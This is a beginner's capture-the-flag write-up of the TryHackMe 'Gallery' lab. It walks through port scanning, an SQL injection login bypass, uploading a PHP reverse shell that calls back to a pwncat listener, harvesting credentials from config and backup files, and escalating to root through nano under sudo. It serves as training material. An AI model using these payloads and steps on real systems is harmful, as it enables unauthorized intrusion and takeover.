# Overview
This is my first writeup, so if there are any misleading information or mistakes, I sincerely apologize to you!

In this TryHackMe room, [Gallery](https://tryhackme.com/room/gallery666) difficulty is rated at Easy, which wonderful for beginners like me! Lol

What you will learn:
1. Basic SQL Injection
2. Linux Privilege Escalation

# Background
> Our gallery is not very well secured.

# Reconnaissance
As usual, scan the machine via `rustscan`.
```
┌──(root💀nam)-[~/thm/ctf/Gallery/writeups]
└─# rustscan --ulimit 5000 -t 2000 --range 1-65535 -a $IP -- -sC -sV -oN scanning/rustscan.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.147.19:80
Open 10.10.147.19:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 04:54 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Initiating Ping Scan at 04:54
Scanning 10.10.147.19 [4 ports]
Completed Ping Scan at 04:54, 0.34s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:54
Completed Parallel DNS resolution of 1 host. at 04:54, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 04:54
Scanning 10.10.147.19 [2 ports]
Discovered open port 80/tcp on 10.10.147.19
Discovered open port 8080/tcp on 10.10.147.19
Completed SYN Stealth Scan at 04:54, 0.33s elapsed (2 total ports)
Initiating Service scan at 04:54
Scanning 2 services on 10.10.147.19
Completed Service scan at 04:54, 6.63s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.147.19.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:54
Completed NSE at 04:54, 10.56s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:54
Completed NSE at 04:54, 1.34s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Nmap scan report for 10.10.147.19
Host is up, received reset ttl 61 (0.29s latency).
Scanned at 2022-04-27 04:54:03 EDT for 19s

PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: A51D220EEC6810F1355938ED2D2166F7

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:54
Completed NSE at 04:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.66 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
```
According to the above scanning, I've found `2` open ports: `80` and `8080`.

Port 80 is a default Apache home page.
![default Apache home page](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gallery/images/80.png)
When I visit port 8080, it redirects me to `/gallery/login.php`.
![Gallery login page](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gallery/images/login.png)

# Exploitation
> Get a shell

At here, after googling, I found the CMS is `Simple Image Gallery`. Then, I try to do a SQL Injection at the login page. Let's try the low-hanging fruit of SQLi, `' OR 1=1-- -`.
![SQLi](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gallery/images/sqli.png)
![adminpage](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gallery/images/adminpage.png)
Bang! We've successfully login as admin user. Then, I started to fumble around, and I found a upload page at `My Account` where I can upload an avatar.
![upload](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Gallery/images/upload.png)
Let's click on browse, and upload a `php reverse shell`. I'll use a php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
```
┌──(root💀nam)-[~/thm/ctf/Gallery]
└─# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
Modify your listener IP address and port.
Setup a listener, I'll use [`pwncat`](https://github.com/calebstewart/pwncat) to upgrade and stable the reverse shell automatically.(Tips. Hit `Ctrl+D` to switch between remote and local)
```
┌──(root💀nam)-[~/thm/ctf/Gallery]
└─# pwncat-cs -l 10.2.119.204 4444                                                                     
[06:12:21] Welcome to pwncat 🐈!                                                                          __main__.py:164
[06:12:44] received connection from 10.10.147.19:57072                                                         bind.py:84
[06:12:49] 10.2.119.204:4444: upgrading from /bin/dash to /bin/bash                                        manager.py:957
[06:12:51] 10.10.147.19:57072: registered new host w/ db                                                   manager.py:957
(local) pwncat$                                                                                                          
(remote) www-data@gallery:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Privilege Escalation
After having the reverse shell, I started to exploring this machine's home directory.
I found a user flag at `/home/mike`
```
(remote) www-data@gallery:/home/mike$ ls -la
total 44
drwxr-xr-x 6 mike mike 4096 Aug 25  2021 .
drwxr-xr-x 4 root root 4096 May 20  2021 ..
-rw------- 1 mike mike  135 May 24  2021 .bash_history
-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike 3772 May 20  2021 .bashrc
drwx------ 3 mike mike 4096 May 20  2021 .gnupg
drwxrwxr-x 3 mike mike 4096 Aug 25  2021 .local
-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
drwx------ 2 mike mike 4096 May 24  2021 documents
drwx------ 2 mike mike 4096 May 24  2021 images
-rwx------ 1 mike mike   32 May 14  2021 user.txt
```
However, it **only readable by mike.**

Then, I discovered a initialize.php file at `/var/www/html/gallery`, which contains MySQL user credentials.
```
(remote) www-data@gallery:/var/www/html/gallery$ cat initialize.php 
<?php
$dev_data = array('id'=>'-1','firstname'=>'---redacted---','lastname'=>'','username'=>'---redacted---','password'=>'---redacted---','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"---redacted---");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"---redacted---");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
``` 
Using that credential to login into MySQL.
```
(remote) www-data@gallery:/var/www/html/gallery$ mysql -u [redacted] -p gallery_db
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 365
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [gallery_db]> 
```
Find all the tables inside gallery_db database.
```
MariaDB [gallery_db]> show tables;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.00 sec)
```
The `users` tables looks kinda sussy, let's check that out.
```
MariaDB [gallery_db]> SELECT * FROM users;
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                                   | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | ---redacted---                   | uploads/1651054320_php-reverse-shell.php | NULL       |    1 | 2021-01-20 14:02:37 | 2022-04-27 10:12:42 |
+----+--------------+----------+----------+----------------------------------+------------------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.00 sec)
```
Yes! We found the admin hash!
However, I found this hash is **uncrackable** after cracking it 20 minutes. Let's found another Privilege Escalation vector.

After a couple minutes of nonsense, I found a `backups` directory at `/var`
Let's move to this directory.
```
(remote) www-data@gallery:/var$ ls -la
total 52
drwxr-xr-x 13 root root   4096 May 20  2021 .
drwxr-xr-x 23 root root   4096 Feb 12 21:42 ..
drwxr-xr-x  3 root root   4096 Apr 27 08:50 backups
---redacted---
```
```
(remote) www-data@gallery:/var/backups$ ls -la
total 60
drwxr-xr-x  3 root root  4096 Apr 27 08:50 .
drwxr-xr-x 13 root root  4096 May 20  2021 ..
-rw-r--r--  1 root root 34789 Feb 12 21:40 apt.extended_states.0
-rw-r--r--  1 root root  3748 Aug 25  2021 apt.extended_states.1.gz
-rw-r--r--  1 root root  3516 May 21  2021 apt.extended_states.2.gz
-rw-r--r--  1 root root  3575 May 20  2021 apt.extended_states.3.gz
drwxr-xr-x  5 root root  4096 May 24  2021 mike_home_backup
```
mike_home_backup, hmm...
```
(remote) www-data@gallery:/var/backups/mike_home_backup$ ls -la
total 36
drwxr-xr-x 5 root root 4096 May 24  2021 .
drwxr-xr-x 3 root root 4096 Apr 27 08:50 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4096 May 24  2021 documents
drwxr-xr-x 2 root root 4096 May 24  2021 images
```
Inside the documents directory, I found some credentials of mike?? Oh, it's useless for Privilege Escalation. Let's go back.
Then, I found the `.bash_history` is weird, since it's **readable for us.**
```
(remote) www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history 
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -l---redacted---
clear
sudo -l
exit
```
Lol, we've mike credential by viewing his sudo command! Let's pivot to mike user.
```
(remote) www-data@gallery:/var/backups/mike_home_backup$ su -l mike
Password: 
mike@gallery:~$ 
```
Now we can cat the user flag!
```
mike@gallery:~$ cat user.txt
---redacted---
```

> Escalate to the root user

If you run `sudo -l` command, you'll see mike can have sudo permission in `/bin/bash /opt/rootkit.sh`
```
mike@gallery:~$ sudo -l
Matching Defaults entries for mike on gallery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```
Let's see the source code of the rootkit.sh bash script!
```
mike@gallery:~$ cat /opt/rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```
Looks like `nano` can be a Privilege Escalation vector!
According to [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo), we can escalate to root user with sudo permission.
```
mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? read
^R^X
reset; sh 1>&0 2>&0

# id
uid=0(root) gid=0(root) groups=0(root)
```
Oh! I'm root now:D
Let's cat the root flag out and done!
```
# cat /root/root.txt
---redacted---
```

# Conclusion
That's it for this room! I hope you guys are enjoyed this writeup! Since this is my first writeup, so if you have any suggestions for my writeup, please feel free to contact me via my email, siunam321atcybersec@gmail.com.